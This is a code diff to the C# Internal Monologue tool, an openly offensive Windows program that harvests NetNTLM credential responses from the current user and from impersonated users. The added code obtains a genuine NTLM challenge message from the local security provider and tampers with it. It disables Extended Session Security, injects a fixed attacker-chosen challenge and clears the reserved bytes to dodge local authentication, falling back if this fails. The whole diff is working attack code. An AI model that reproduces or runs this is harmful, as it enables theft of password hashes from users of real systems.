@@ -95,6 +95,17 @@ namespace InternalMonologue
             out uint pfContextAttr,
             out SECURITY_INTEGER ptsExpiry);
 
+        [DllImport("secur32.dll", SetLastError = true)]
+        static extern int AcceptSecurityContext(ref SECURITY_HANDLE phCredential,
+            IntPtr phContext,
+            ref SecBufferDesc pInput,
+            uint fContextReq,
+            uint TargetDataRep,
+            out SECURITY_HANDLE phNewContext,
+            out SecBufferDesc pOutput,
+            out uint pfContextAttr,
+            out SECURITY_INTEGER ptsTimeStamp);
+
         [DllImport("advapi32.dll", SetLastError = true)]
         private static extern bool OpenProcessToken(
             IntPtr ProcessHandle,
@@ -274,7 +285,7 @@ namespace InternalMonologue
                             using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                             {
                                 if (verbose == true) console.AddConsole(string.Format("Impersonated user {0}\n", WindowsIdentity.GetCurrent().Name));
-                                var result = InternalMonologueForCurrentUser(challenge);
+                                var result = InternalMonologueForCurrentUser(challenge, true);
                                 //Ensure it is a valid response and not blank
                                 if (!result.Resp1.IsNullOrWhiteSpace())
                                 {
@@ -347,7 +358,7 @@ namespace InternalMonologue
                             using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                             {
                                 if (verbose == true) console.AddConsole(string.Format("Impersonated user {0}\n", WindowsIdentity.GetCurrent().Name));
-                                var result = InternalMonologueForCurrentUser(challenge);
+                                var result = InternalMonologueForCurrentUser(challenge, true);
                                 //Ensure it is a valid response and not blank
                                 if (!result.Resp1.IsNullOrWhiteSpace())
                                 {
@@ -424,7 +435,7 @@ namespace InternalMonologue
                 else
                 {
                     if (verbose == true) console.AddConsole("Performing attack on current user only (no impersonation)\n");
-                    var response = InternalMonologueForCurrentUser(challenge);
+                    var response = InternalMonologueForCurrentUser(challenge, true);
                     console.AddResponse(response);
                     console.AddConsole(string.Format("{0}\n", response.ToString()));
                 }
@@ -440,7 +451,7 @@ namespace InternalMonologue
             {
                 //If the process is not elevated, skip downgrade and impersonation and only perform an Internal Monologue Attack for the current user
                 if (verbose == true) console.AddConsole("Not elevated. Performing attack with current NTLM settings on current user\n");
-                var response = InternalMonologueForCurrentUser(challenge);
+                var response = InternalMonologueForCurrentUser(challenge, true);
                 console.AddResponse(response);
                 console.AddConsole(string.Format("{0}\n", response.ToString()));
             }
@@ -451,34 +462,36 @@ namespace InternalMonologue
         }
 
         //This function performs an Internal Monologue Attack in the context of the current user and returns the NetNTLM response for the challenge 0x1122334455667788
-        private InternalMonologueResponse InternalMonologueForCurrentUser(string challenge)
+        private InternalMonologueResponse InternalMonologueForCurrentUser(string challenge, bool DisableESS)
         {
             SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
+            SecBufferDesc ServerToken = new SecBufferDesc(MAX_TOKEN_SIZE);
 
-            SECURITY_HANDLE _hOutboundCred;
-            _hOutboundCred.LowPart = _hOutboundCred.HighPart = IntPtr.Zero;
+            SECURITY_HANDLE _hCred;
+            _hCred.LowPart = _hCred.HighPart = IntPtr.Zero;
             SECURITY_INTEGER ClientLifeTime;
             ClientLifeTime.LowPart = 0;
             ClientLifeTime.HighPart = 0;
             SECURITY_HANDLE _hClientContext;
+            SECURITY_HANDLE _hServerContext;
             uint ContextAttributes = 0;
 
             // Acquire credentials handle for current user
             AcquireCredentialsHandle(
                 WindowsIdentity.GetCurrent().Name,
                 "NTLM",
-                2,
+                3,
                 IntPtr.Zero,
                 IntPtr.Zero,
                 0,
                 IntPtr.Zero,
-                ref _hOutboundCred,
+                ref _hCred,
                 ref ClientLifeTime
                 );
 
             // Get a type-1 message from NTLM SSP
             InitializeSecurityContext(
-                ref _hOutboundCred,
+                ref _hCred,
                 IntPtr.Zero,
                 WindowsIdentity.GetCurrent().Name,
                 0x00000800,
@@ -491,15 +504,37 @@ namespace InternalMonologue
                 out ContextAttributes,
                 out ClientLifeTime
                 );
-            ClientToken.Dispose();
+
+            // Get a type-2 message from NTLM SSP (Server)
+            AcceptSecurityContext(
+                ref _hCred,
+                IntPtr.Zero,
+                ref ClientToken,
+                0x00000800,
+                0x10,
+                out _hServerContext,
+                out ServerToken,
+                out ContextAttributes,
+                out ClientLifeTime
+                );
+
+            // Tamper with the CHALLENGE message
+            byte[] serverMessage = ServerToken.GetSecBufferByteArray();
+            byte[] challengeBytes = StringToByteArray(challenge);
+            if (DisableESS)
+            {
+                serverMessage[22] = (byte)(serverMessage[22] & 0xF7);
+            }
+            //Replace Challenge
+            Array.Copy(challengeBytes, 0, serverMessage, 24, 8);
+            //Reset reserved bytes to avoid local authentication
+            Array.Copy(new byte[16], 0, serverMessage, 32, 16);
+
+            ServerToken = new SecBufferDesc(serverMessage);
 
             ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
-
-            // Custom made type-2 message with the specified challenge
-            byte[] challengeBytes = StringToByteArray(challenge);
-            SecBufferDesc ServerToken = new SecBufferDesc(new byte[] { 78, 84, 76, 77, 83, 83, 80, 0, 2, 0, 0, 0, 0, 0, 0, 0, 40, 0, 0, 0, 1, 0x82, 0, 0, challengeBytes[0], challengeBytes[1], challengeBytes[2], challengeBytes[3], challengeBytes[4], challengeBytes[5], challengeBytes[6], challengeBytes[7], 0, 0, 0, 0, 0, 0, 0, 0 });
-            InitializeSecurityContext(
-                ref _hOutboundCred,
+            int resCode = InitializeSecurityContext(
+                ref _hCred,
                 ref _hClientContext,
                 WindowsIdentity.GetCurrent().Name,
                 0x00000800,
@@ -512,6 +547,16 @@ namespace InternalMonologue
                 out ContextAttributes,
                 out ClientLifeTime
                 );
+
+            //If failed, retry without disabling ESS
+            if (resCode != 0 && DisableESS)
+            {
+                ClientToken.Dispose();
+                ServerToken.Dispose();
+
+                return InternalMonologueForCurrentUser(challenge, false);
+            }
+
             byte[] result = ClientToken.GetSecBufferByteArray();
 
             ClientToken.Dispose();
